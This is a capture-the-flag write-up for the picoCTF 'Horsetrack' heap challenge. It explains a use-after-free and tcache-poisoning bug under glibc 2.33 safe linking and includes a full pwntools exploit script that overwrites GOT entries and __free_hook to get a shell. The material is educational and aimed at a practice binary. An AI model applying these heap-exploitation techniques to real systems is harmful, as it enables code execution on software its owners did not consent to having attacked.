# Horsetrack - PWN

## desc
I'm starting to write a game about horse racing, would you mind testing it out? Maybe you can find some of my easter eggs... Hopefully it's a heap of fun!
Additional details will be available after launching your challenge instance.

## recon

This challenge give us patched binary, its libc, and linker, looking at the libc given first thing i want to check is the libc version that this binary patched
with, by typing `string libc.so.6 | grep GNU` we know what the libc version it's using.

![libc version](https://raw.githubusercontent.com/UnoArroefy/CTF-Writeups/main/pico2023/Horsetrack/h0.png)

with this information we know that 
1. libc 2.33 have safe linking procedure means that if the bug is about uaf and tcache poisoning (which this challenge bug is) we have to deal with mangling and demangling, so we don't get malloc unaligned error 
2. remember about aligned chunk, we can't malloc chunk if the last nible isn't 0, so it always be 0.
3. and we know that libc 2.33 still have `__free_hook`, we can put system and free malloc with `/bin/sh` string (apparently this technique cannot work on remote later why)

now let's check the binary mitigations, we can use checksec to do it

![mitigations](https://raw.githubusercontent.com/UnoArroefy/CTF-Writeups/main/pico2023/Horsetrack/h1.png)

from this we know that this binary PIE was disabled and it isn't FULL RELRO means we can overwrite got, now come the handy parts searching bugs in program we have to reverse engineer this binary, i use ghidra to do this, note that people said that ghidra isn't really good decompiling binary that have switch operation and this binary is using switch operation, and in my decompilation it got skipped somehow so i have to do manual decompilation by typing d in the opcodes that doesn't get decompiled and it's causing hard to read a little bit (because some of it still didn't get decompiled).

There's a user in discord that said i can use ghidra script manager to deal with this anomaly, but since i already done with my static analysis i don't really try it out and search how to use it.

okay so let's check the decompilation, so basically switch operation is just switch operation nothing important, what's important is in the add function but since the binary is stripped we don't know the name of the add function but it works something like adding a horse.

![add func](https://raw.githubusercontent.com/UnoArroefy/CTF-Writeups/main/pico2023/Horsetrack/h2.png)

note that this function naming is for myself to understand the binary because is stripped, when you run the program it's always asking for strings i think it's for horse naming purposes, seriously we have to input something but the thing is we can't put something if we want to leak something from it so the trick is to fail the getchar to return -1 with `\xff`, you can see the decompilation below.

![after_add func](https://raw.githubusercontent.com/UnoArroefy/CTF-Writeups/main/pico2023/Horsetrack/h3.png)

there's another function that we have to know, when we type 0 the switch operation actually call something i called it cheat function because it's like cheathing the race thos we get disqualified if we do that, but there's alway a trick.

![cheat func](https://raw.githubusercontent.com/UnoArroefy/CTF-Writeups/main/pico2023/Horsetrack/h4.png)

look at the switch operation there's variable that get assign by 1, we can overwrite that to avoid getting caught for cheating because for some exploit this is a must.

the cheat function it self can lead us to uaf bug, where we can still change value although the chunk have been freed because we don't nulled out the pointer and yes it can causes us to poison the tcache (that's what we do).

so with all information that we gather i have 3 exploit that works on local but just one works in remote.
1. because the binary PIE was disabled and PARTIAL RELRO we can overwrite free got with system plt, this will caused calling system when we free chunk, if the chunk contains `/bin/sh` we can get a shell.
2. same as 1 we can overwrite got but this time we overwrite malloc got with one_gadget, why we overwrite malloc got?? because it's matched the requirements for calling one_gadget.
3. this exploit doesn't require us to overwriting got, but this one will works the same as 1, we overwrite the `__free_hook` with system and when we free chunk that contains `/bin/sh` we can get a shell.

exploit 1 doesn't require libc leak, but 2 and 3 are required us to leak the libc first and that's what causes that scenario cannot be used agains the remote server, first i don't know why the remote behave like that but some users on discord meantion that remote using socat with pty that causes LF->CRLF and poorly intrepret `\x7f` something like that i don't really understand but simply it's means our libc leak won't be right.

## exploit

remember that i said before libc 2.33 implement safe linking and we have to mangle and demangle so our exploit will works, here is how to mangle and demangle, mangling and demangling is a way to defeat safe linking but first what we need to do is leak heap address.

implement the mangle and demangle function to defeat safe linking

```python
def demangle(addr):
    mid = addr >> 12 ^ addr
    ril = mid >> 24 ^ mid
    return ril

def mangle(val, target):
    return val >> 12 ^ target
 ```
 add horses and remove so we can leak heap address, we add lot of horse for the race (min. 5)
 
 ```python
add_horse(0,32, b'\xff')
add_horse(1,32, b'1'*32)
add_horse(2,32, b'2'*32)
add_horse(3,32, b'3'*32)
add_horse(4,32, b'4'*32)
add_horse(5,32, b'5'*32)
add_horse(6,32, b'6'*32)

remove_horse(1)
remove_horse(0)

add_horse(0, 32, b'\xff')
add_horse(1, 32, b'\xff')

race()
leak = demangle(u64(p.recvuntil(b'|').split(b'|')[0].strip().split(b'\n')[-1].split(b'Choice: ')[-1].strip().ljust(8, b'\x00')))
 ```

once we get our leak it's pretty straight forward to do exploit 1 scenario

```python
free_got = 0x404010 # free in + 8
systemplt = elf.plt.system

remove_horse(1)
remove_horse(0)

cheat(0, 0, p64(mangle(leak, free_got)) + b'\xff')

add_horse(1, 32, b'\xff')
add_horse(0, 32, p64(systemplt) +p64(systemplt) + b'\xff')

add_horse(17, 32, b'/bin/sh\x00' + b'\xff')
remove_horse(17)
```

with that payload we can get a shell remote and local.

to leak libc we have to poison the tcache, first with got that contain libc address (i use stdout) and second overwrite cheat checker with null so we don't get caught.

```python 
stdout = 0x04040c0
cek_cit = 0x04040e0 # ec is check but it's unaligned to use ec

remove_horse(1)
remove_horse(0)

cheat(0, 0, p64(mangle(leak, stdout)) + b'\xff')

add_horse(1, 32, b'\xff')
add_horse(0, 32, b'\xff')

remove_horse(3)
remove_horse(2)

cheat(2, 2, p64(mangle(leak, cek_cit)) + b'\xff')

add_horse(3, 32, b'\x00'*32)
add_horse(2, 32, b'\x00'*32) # overwrite cheat cek

for i in range(4, 7):
    remove_horse(i)

for i in range(4, 7):
    add_horse(i, 32, b'dum'+b'y'*29)

race()
libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.symbols._IO_2_1_stdout_
print(hex(libc.address))
```

once you get libc leak you can do exploit 2 and 3

```python
# -------------exploit free hook system---------------------

remove_horse(5)
remove_horse(6)
cheat(6, 6, p64(mangle(leak, libc.symbols.__free_hook)) + b'\xff')
add_horse(6, 32, b'\xff')

add_horse(7, 32, p64(libc.symbols.system) + b'\xff') # [idk why segfault happen here (remote)]

add_horse(17, 32, b'/bin/sh\x00' + b'\xff')
remove_horse(17)

# ---------------exploit overwrite malloc got with one_gadget----------------

remove_horse(5)
remove_horse(6)

getchar = 0x404070 # malloc got (target) after this
excve = libc.address + 0xcad20

cheat(6, 6, p64(mangle(leak, getchar)) + b'\xff')

add_horse(6, 32, b'\xff')
add_horse(7, 32, p64(libc.symbols.getchar) + p64(excve) + b'\xff') # overwrite malloc with excve  [idk why segfault happen here (remote)]

add_horse(17, 32, b'ls') # shell already
```
additionally if you want something that's more complicated i have the 4th scenario, where you leak stack and overwriting rip to one_gadget or rop system get shell.

first thing you need to know is we can leak stack with libc environ and calculate rip, after that we can malloc to that address and make our rop payload. but i haven't test it out since i have to do race once again to leak stack and it's really time consuming,i don't even know if the last nible of libc environ address is 0 or not, but it's good to know there's another way to do it.

i comment out some of the payload because in the end the 1st sceneario works on both local and remote, here's my full solver script.

```python
#!/usr/bin/env python3

from pwn import *

exe = 'vuln'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.log_level = 'warning'

cmd = '''
set follow-fork-mode parent
c
'''

if args.REMOTE:
    p = remote('saturn.picoctf.net', 53868)
else:
    p = process()

### EXPLOIT HERE ###

def demangle(addr):
    mid = addr >> 12 ^ addr
    ril = mid >> 24 ^ mid
    return ril

def mangle(val, target):
    return val >> 12 ^ target

def add_horse(idx, length, payload):
    p.sendline(b'1')
    p.sendline(f'{idx}'.encode())
    p.sendline(f'{length}'.encode())
    p.sendline(payload)

def remove_horse(idx):
    p.sendline(b'2')
    p.sendline(f'{idx}'.encode())

def cheat(idx, spot, payload):
    p.sendline(b'0')
    p.sendline(f'{idx}'.encode())
    p.sendline(payload)
    p.sendline(f'{spot}'.encode())

def race():
    p.sendline(b'3')

# gdb.attach(p, cmd)

add_horse(0,32, b'\xff')
add_horse(1,32, b'1'*32)
add_horse(2,32, b'2'*32)
add_horse(3,32, b'3'*32)
add_horse(4,32, b'4'*32)
add_horse(5,32, b'5'*32)
add_horse(6,32, b'6'*32)

remove_horse(1)
remove_horse(0)

add_horse(0, 32, b'\xff')
add_horse(1, 32, b'\xff')

race()
leak = demangle(u64(p.recvuntil(b'|').split(b'|')[0].strip().split(b'\n')[-1].split(b'Choice: ')[-1].strip().ljust(8, b'\x00')))
# print(hex(leak))

# -----------------exploit with no libc leak overwriting free got to systemplt-----------------

free_got = 0x404010 # free in + 8
systemplt = elf.plt.system

remove_horse(1)
remove_horse(0)

cheat(0, 0, p64(mangle(leak, free_got)) + b'\xff')

add_horse(1, 32, b'\xff')
add_horse(0, 32, p64(systemplt) +p64(systemplt) + b'\xff')

add_horse(17, 32, b'/bin/sh\x00' + b'\xff')
remove_horse(17)

# --------------------leak libc---------------------

# stdout = 0x04040c0
# cek_cit = 0x04040e0 # ec is check but it's unaligned to use ec

# remove_horse(1)
# remove_horse(0)

# cheat(0, 0, p64(mangle(leak, stdout)) + b'\xff')

# add_horse(1, 32, b'\xff')
# add_horse(0, 32, b'\xff')

# remove_horse(3)
# remove_horse(2)

# cheat(2, 2, p64(mangle(leak, cek_cit)) + b'\xff')

# add_horse(3, 32, b'\x00'*32)
# add_horse(2, 32, b'\x00'*32) # overwrite cheat cek

# for i in range(4, 7):
#     remove_horse(i)

# for i in range(4, 7):
#     add_horse(i, 32, b'dum'+b'y'*29)

# race()
# libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.symbols._IO_2_1_stdout_
# print(hex(libc.address))


# -------------exploit free hook system---------------------

# remove_horse(5)
# remove_horse(6)
# cheat(6, 6, p64(mangle(leak, libc.symbols.__free_hook)) + b'\xff')
# add_horse(6, 32, b'\xff')

# add_horse(7, 32, p64(libc.symbols.system) + b'\xff') # [idk why segfault happen here (remote)]

# add_horse(17, 32, b'/bin/sh\x00' + b'\xff')
# remove_horse(17)

# ---------------exploit overwrite malloc got with one_gadget----------------

# remove_horse(5)
# remove_horse(6)

# getchar = 0x404070 # malloc got (target) after this
# excve = libc.address + 0xcad20

# cheat(6, 6, p64(mangle(leak, getchar)) + b'\xff')

# add_horse(6, 32, b'\xff')
# add_horse(7, 32, p64(libc.symbols.getchar) + p64(excve) + b'\xff') # overwrite malloc with excve  [idk why segfault happen here (remote)]

# add_horse(17, 32, b'ls') # shell already



p.interactive()

'''
0xcad1a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xcad1d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xcad20 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''
```

i still new at this heap exploitation or binary exploit in general, so if there's mistake in this write up i'm really sorry, but hope you learn something.
